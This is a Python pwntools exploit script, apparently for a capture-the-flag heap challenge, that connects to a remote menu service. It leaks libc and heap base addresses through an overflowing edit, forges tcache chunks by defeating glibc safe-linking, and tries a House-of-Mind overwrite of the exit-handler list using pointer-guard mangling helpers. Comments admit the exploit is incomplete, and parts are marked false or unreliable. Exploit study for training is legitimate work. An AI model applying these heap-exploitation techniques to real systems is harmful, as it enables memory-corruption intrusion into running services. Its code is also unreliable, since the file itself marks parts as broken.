#!/usr/bin/python3

#import libraries
import sys
import time
from pathlib import Path
from ctypes import CDLL
from itertools import count
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13725
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


#Set this to True if you wand an interactive shell INSTEAD of the flag.
spawn_interactive_shell = False

str_menuboundary = b"-------------------------------------------\n"

str_prompt_cmd = str_menuboundary + b"> "
str_prompt_index = b"Index: "
str_prompt_data = b"Gimme data...\n"
#store() prompts
str_prompt_store_amount = b"How much would you like to store? "
str_prompt_store_location = b"Where? "
str_prompt_store_data = str_prompt_data
str_store_end = b"Data received!\n"
#edit() prompts
str_prompt_edit_index = str_prompt_index
str_prompt_edit_length = b"Length: "
str_prompt_edit_data = str_prompt_data
str_edit_end = b"Data received!\n"
#doread() prompts
str_prompt_doread_index = str_prompt_index
str_doread_end = b"\n"
#release() prompts
str_prompt_release_index = str_prompt_index

str_error_choice = b"Invalid Choice\n"
str_error_index_taken = b"Index already taken!\n"
str_error_index_unallocated = b"Index is not allocated!\n"
str_error_index_freed = b"Index already free!\n"
str_error_index_outofbounds = b"Index out of bounds! Max is 4096\n"
str_error_amount_tohigh = b"Amount too high!\n"
str_error_outofmemory = b"Not enough memory...\n"
str_error_number_invalid = b"Invalid Number"

errorcode_success = 0x00
errorcode_amount_tohigh = 0x01
errorcode_outofmemory = 0x02
errorcode_number_invalid = 0x03
errorcode_index_taken = 0x11
errorcode_index_unallocated = 0x12
errorcode_index_freed = 0x13
errorcode_index_outofbounds = 0x14
errorcode_unknown = 0x20

str_cmd_store = b"1"
str_cmd_edit = b"2"
str_cmd_doread = b"3"
str_cmd_release = b"4"


#NOTE: THIS EXPLOIT IS WORK IN PROGRESS AND DOES NOT WORK
#take a look at notes.txt for conceptual idea


#This is where the exploit lives.
def exploit():

    print("[Debug] Testing pointer mangling functions on manually obtaind test values:")
    example_mangling()
    print("")

    proc = remote(host, port, fam="ipv4")

    tmp_res = proc.readline()
    print(tmp_res.decode())
    for i in range(10):
        target_store(proc, b"512", str(1 + i).encode(), chr(0x41 + i).encode() * 8, newline_terminate_data=False)
    for i in range(8):
        target_release(proc, str(10 - i).encode())

    target_edit(proc, b"2", b'2048', b"BBBBBBBB", newline_terminate_data=False)
    heap_leak = target_doread(proc, b"2")[0]
    #print(heap_leak[0x208:0x210])
    chunk3_fp_unmangled = int.from_bytes(heap_leak[0x208:0x210], "little")
    #print(f"{chunk3_fp_unmangled:#0{0}18x}")
    glibc_base = chunk3_fp_unmangled - 0x1dbc00
    print(f"(-) Successfully leaked libc base address: {glibc_base:#0{0}18x}")
    # everything after this is false
    chunk4_fp_encrypted = int.from_bytes(heap_leak[0x438:0x440], "little")
    chunk4_fp_decrypted = decrypt(chunk4_fp_encrypted)
    # print(f"(-) Successfully decrypted chunk 4 forward pointer: {chunk4_fp_decrypted:#0{0}18x}")
    heap_base = chunk4_fp_decrypted - 0x22ff0
    print(hex(chunk4_fp_decrypted))
    print(f"(-) Successfully leaked heap base address: {heap_base:#0{0}18x}")
    # TODO: the following 2 snippets should at the end be adapted to work together
    # snippet 1:
    # forging tcache chunk in order to overwrite glibc data section
    glibc_data_section_target_chunk_address = glibc_base + 0x1db2f0 # aligned, with a large enough size placeholder, and NULL where fields[index] should be
    pos = heap_base + 0x22dc0
    print(f"pos={pos:#0{0}18x}")
    glibc_data_section_target_chunk_address_encrypted = encrypt(pos, glibc_data_section_target_chunk_address)
    target_edit(proc, b"2", b'2048', b"B"*0x428+p64(0x230)+p64(0x231)+p64(glibc_data_section_target_chunk_address_encrypted), newline_terminate_data=False, verbose=True, decode_output=True)
    assert glibc_data_section_target_chunk_address == encrypt(pos, glibc_data_section_target_chunk_address_encrypted) # encrypt(pos==&ptr, ptr) is same as decrypt(ptr)
    print(f"glibc_data_section_address={glibc_data_section_target_chunk_address:#0{0}18x}")
    print(f"glibc_data_section_target_chunk_address_encrypted={glibc_data_section_target_chunk_address_encrypted:#0{0}18x}")
    target_store(proc, b"512", b"10", b"XXXXXXXX", newline_terminate_data=False)
    # unfortunately at this point, we couldn't allocate the chunk in glibc .data  segment
    target_store(proc, b"24", b"11", b"", newline_terminate_data=False)
    input()
    # snippet 2:
    MAX_SIZE = (128 * 1024) - 0x100;
    target_store(proc, hex(MAX_SIZE).encode(), b"3", 50 * b"Q")
    # leak_heap_below_cryptolib(proc)
    override_exit_hook_list(proc, glibc_base, heap_base)
    input()
    proc.close()
    return True


def leak_heap_below_cryptolib(proc):
    print("ABC")
    for i in range(12, 0x60):
        target_store(proc, hex(0x80).encode(), hex(i).encode(), b"\x00")
    print("DEF")
    for i in reversed(range(0x31, 0x60)):
        target_release(proc, hex(i).encode())
    print("GHI")
    target_edit(proc, b"0x30", b'0x4000', b"BBBBBBBB", newline_terminate_data=False)
    heap_leak2 = target_doread(proc, b"2")[0][1640:1640 + 8]
    for i in reversed(range(12, 0x31)):
        target_release(proc, hex(i).encode())
    retval = decrypt(int.from_bytes(heap_leak2, 'little'))
    print(hex(retval))
    return retval


def override_exit_hook_list(proc, addr_libc_base, addr_heap_base, offset_heap_allocnext=0x0):
    # BASED ON house of mind
    # NOT YET working...

    # IDEA: try to hit next address that's divisible by HEAP_MAX_SIZE
    # write address of __exit_funcs pointer in libc .data section offset by a few address-lengths (n*8 byte) to it
    # this will be considered the arena pointer in the fake heap_info struct at fake heap base
    # then allocate smallbin after that and override its size so that non-main-arena bit is set
    # it will then lookup arena via fake heap_info struct
    # hence heap address of freed chunk will be written to at __ext_funcs pointer in libc
    # then fake list of exit functions can be crafted at this heap address
    # for this we need the leak of a mangled pointer to reconstruct pointer guard and use it to mangle system@libc appropriately
    # (please take a look at notes.txt for more)
    # unfortunately the heap leak is somewhat unreliable :S

    # also note: we write the address more often than necessary.
    # by writing at the end of each page allignment, we can increase our chances of hitting something
    # Messed up the allignment atm thoug TODO: fix

    addr_libc_exit_hook_list = addr_libc_base + 0x1db760
    arena_ptr = addr_libc_exit_hook_list - 0x30

    addr_heap_newleak = leak_heap_below_cryptolib(proc)

    HEAP_MAX_SIZE = 0x4000000;
    # MAX_SIZE = 0x10000-0x30
    ALLOC_SIZE = 0x1000

    print(hex(arena_ptr))
    print(HEAP_MAX_SIZE // ALLOC_SIZE)

    # allignment_correction = (addr_heap_base % 0x1000)
    # print(hex(addr_heap_base))
    # print(hex(allignment_correction))

    # use up small, empty memory and allocate something to fill tcache with later on
    for i in range(0, 0x40):
        # NOTE: due to overhead this allocates a chunk of size 0x50
        target_store(proc, b"0x18", hex(i + 0x10).encode(), b"0")

    # ensure nice alignment on heap
    # target_store(proc, hex(allignment_correction-0x100).encode(), b"11", b"0")
    target_store(proc, hex(0x180).encode(), b"12", b"0")

    print(hex(addr_heap_newleak))

    # correctional_val = (addr_heap_base & 0x3C00000) // 0x10000
    # correctional_val = min(((0x3F00000 - (addr_heap_newleak & 0x3F00000)) - 0x80000)//0x10000, 0)
    # print(hex(correctional_val))

    # correctional_val = min(((addr_heap_newleak - (0xFFFFFC000000 & addr_heap_newleak)) // 0x10000) - 1, 0)
    correctional_val = ((0x3FFFFFF - (0x3FFFFFF & addr_heap_newleak)) // 0x10000) - 1
    print(hex(correctional_val))

    target_store(proc, b"0xB10", b"11", 50 * p64(arena_ptr))
    target_store(proc, b"0xB10", b"10", 50 * p64(arena_ptr))
    target_store(proc, b"0xB10", b"9", 50 * p64(arena_ptr))

    print("AAA...")
    for i in range(0x50, correctional_val + 0x50):
        target_store(proc, hex(0x10000 - 0x30).encode(), hex(i).encode(), 50 * p64(arena_ptr))
        print(f"{i}.. ", end='')

    # last_idx = 0x2FF000 // 0x1000
    # last_idx = 0x1FFFFF // 0x1000
    last_idx = 21 + (0x1FFFFF // 0x1000)
    last_idx += correctional_val + 0x50

    print("Writing to index: [", end='')
    # last_idx = min((HEAP_MAX_SIZE//ALLOC_SIZE)+0x51, 0xF0)#0xFF0)
    print(f"LAST: {last_idx:x}")
    # for i in range(0x50,last_idx):
    for i in range(correctional_val + 0x50, last_idx):
        print(f"{i}, ", end='')
        target_store(proc, hex(ALLOC_SIZE - 0x30).encode(), hex(i).encode(), 50 * p64(arena_ptr))
    print(f"{last_idx}]")

    target_store(proc, hex(0x100).encode(), hex(last_idx).encode(), 20 * p64(arena_ptr))

    for i in range(0, 0x7):
        # NOTE: due to overhead this allocates a chunk of size 0x50
        target_store(proc, b"0x18", hex(last_idx + i + 1).encode(), b"0")

    input()

    for i in range(0, 7):
        target_release(proc, hex(i + 0x10).encode())

    print("OOO")
    input()
    target_edit(proc, hex(last_idx + 3 + 1).encode(), b"0x41", 0x20 * b"\x00" + p64(0x55), newline_terminate_data=False)
    input()

    target_release(proc, hex(last_idx + 4 + 1).encode())

def encrypt(pos, ptr): # equivalent of #define PROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
    return (pos >> 12) ^ ptr # TODO: fix it

# source: https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c
def decrypt(cipher, verbose=False):
    if verbose:
        print("The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known, because of the 12bit sliding. "
          "And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)")
    key = 0
    for i in range(6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
        if verbose:
            print(f"round {i}:")
            print(f"key:    {key:#0{0}18x}", key)
            print(f"plain:  {plain:#0{0}18x}", plain)
            print(f"cipher: {cipher:#0{0}18x}\n", cipher)
    return plain



#pointer mangling, pointer demangling, and pointer guard extraction

def ror64(uint64_t_val, roval):
    uint64_t_bitmask = 0xFFFFFFFFFFFFFFFF
    roval = roval % 64
    res = uint64_t_val >> roval
    res = res | (uint64_t_val << (64-roval))
    res = res & uint64_t_bitmask
    return res

def rol64(uint64_t_val, roval):
    return ror64(uint64_t_val, 64-(roval%64))

const_lp_size = 0x08

def mangle_pointer(pointer, pointer_guard):
    return rol64(pointer ^ pointer_guard, (2*const_lp_size)+1)

def demangle_pointer(mangled_pointer, pointer_guard):
    return ror64(mangled_pointer, (2*const_lp_size)+1) ^ pointer_guard

def extract_pointer_guard(pointer, mangled_pointer):
    return ror64(mangled_pointer, (2*const_lp_size)+1) ^ pointer

def example_mangling():
    mangled_pointer_real = 0x72ff539c9152f787 
    pointer_guard_real = 0x7bc3c6deb0fa95d9
    print(f"  > Leaked mangled pointer (gdb): {mangled_pointer_real:#0{0}18x}")
    print(f"  > Leaked pointer guard (gdb): {pointer_guard_real:#0{0}18x}")
    pointer_calc = demangle_pointer(mangled_pointer_real, pointer_guard_real)
    print(f"  > Reconstructed address: {pointer_calc:#0{0}18x}")
    mangled_pointer_calc = mangle_pointer(pointer_calc, pointer_guard_real)
    print(f"  > Remangled address: {mangled_pointer_calc:#0{0}18x}")
    pointer_guard_calc = extract_pointer_guard(pointer_calc, mangled_pointer_calc)
    print(f"  > Extracted pointer guard: {pointer_guard_calc:#0{0}18x}")
    assert mangled_pointer_real == mangled_pointer_calc
    assert pointer_guard_real == pointer_guard_calc



#I/O helper functions:

def dc_print(output, decode_output=False):
    if decode_output: print(output.decode())
    else: print(output)

def target_enter_cmd(target, cmd, expect_command_prompt=True, newline_terminate=True, verbose=False, decode_output=False):
    if expect_command_prompt:
        tmp_res = target.readuntil(str_prompt_cmd)
        if verbose: dc_print(tmp_res, decode_output)
    target.write(cmd + (b"\n" if newline_terminate else b""))
    return

def unknown_error(verbose=False):
    if verbose: print("Unknown Error occured...")
    return errorcode_unknown

def verboseprint_and_return(message, retval, verbose=False, decode_output=False):
    if verbose: dc_print(message, decode_output)
    return retval

def target_store(target, amount, location, data, cmd=str_cmd_store, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_amount=True, newline_terminate_location=True, newline_terminate_data=True, verbose=False, decode_output=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose, decode_output)
    tmp_res = target.readuntil(str_prompt_store_amount)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(amount + (b"\n" if newline_terminate_amount else b""))

    tmp_res = b""
    while True:
        tmp_res += target.read(timeout=1)
        if str_prompt_store_location in tmp_res: break 
        elif str_error_amount_tohigh in tmp_res: return verboseprint_and_return(tmp_res, errorcode_amount_tohigh, verbose, decode_output)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(location + (b"\n" if newline_terminate_location else b""))

    tmp_res = b""
    while True:
        tmp_res += target.read(timeout=1)
        if str_prompt_data in tmp_res: break 
        elif str_error_index_outofbounds in tmp_res: return verboseprint_and_return(tmp_res, errorcode_index_outofbounds, verbose, decode_output)
        elif str_error_index_taken in tmp_res: return verboseprint_and_return(tmp_res, errorcode_index_taken, verbose, decode_output)
        elif str_error_outofmemory in tmp_res: return verboseprint_and_return(tmp_res, errorcode_outofmemory, verbose, decode_output)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(data + (b"\n" if newline_terminate_data else b""))

    tmp_res = target.readuntil(str_store_end)
    if verbose: dc_print(tmp_res, decode_output)
    return errorcode_success

def target_edit(target, index, length, data, cmd=str_cmd_edit, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_index=True, newline_terminate_length=True, newline_terminate_data=True, verbose=False, decode_output=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose, decode_output)
    tmp_res = target.readuntil(str_prompt_edit_index)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(index + (b"\n" if newline_terminate_index else b""))

    tmp_res = b""
    while True:
        tmp_res += target.read(timeout=1)
        if str_prompt_edit_length in tmp_res: break
        elif str_error_index_unallocated in tmp_res: return verboseprint_and_return(tmp_res, errorcode_index_unallocated, verbose, decode_output)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(length + (b"\n" if newline_terminate_length else b""))

    tmp_res = target.readuntil(str_prompt_edit_data)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(data + (b"\n" if newline_terminate_data else b""))
    tmp_res = target.readuntil(str_edit_end)
    if verbose: dc_print(tmp_res, decode_output)
    return

def target_doread(target, index, cmd=str_cmd_doread, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_index=True, verbose=False, decode_output=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose, decode_output)
    tmp_res = target.readuntil(str_prompt_doread_index)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(index + (b"\n" if newline_terminate_index else b""))

    tmp_res = b""
    data = b""
    while True:
        tmp_res = target.readline()
        if str_error_index_unallocated in tmp_res: return verboseprint_and_return(tmp_res, (None, errorcode_index_unallocated), verbose, decode_output)
        elif str_menuboundary in tmp_res: break
        else: data += tmp_res
    if verbose:
        dc_print(data, decode_output)
        dc_print(tmp_res, decode_output)

    return (data[:-len(str_doread_end)], errorcode_success)

def target_release(target, index, cmd=str_cmd_release, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_index=True, verbose=False, decode_output=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose, decode_output)
    tmp_res = target.readuntil(str_prompt_doread_index)
    if verbose: dc_print(tmp_res, decode_output)
    target.write(index + (b"\n" if newline_terminate_index else b""))

    tmp_res = b""
    tmp_res = target.readline()
    if str_menuboundary in tmp_res: return verboseprint_and_return(tmp_res, errorcode_success, verbose, decode_output)
    elif str_error_index_outofbounds in tmp_res: return verboseprint_and_return(tmp_res, errorcode_index_outofbounds, verbose, decode_output)
    elif str_error_index_freed in tmp_res: return verboseprint_and_return(tmp_res, errorcode_index_freed, verbose, decode_output)
    else: return verboseprint_and_return(tmp_res, unknown_error(verbose), verbose, decode_output)


#Invoke the exploit when the script is executed.
while True:
    if exploit() != True:
        print("\n(X) Retrying after Error...\n")
    else: break


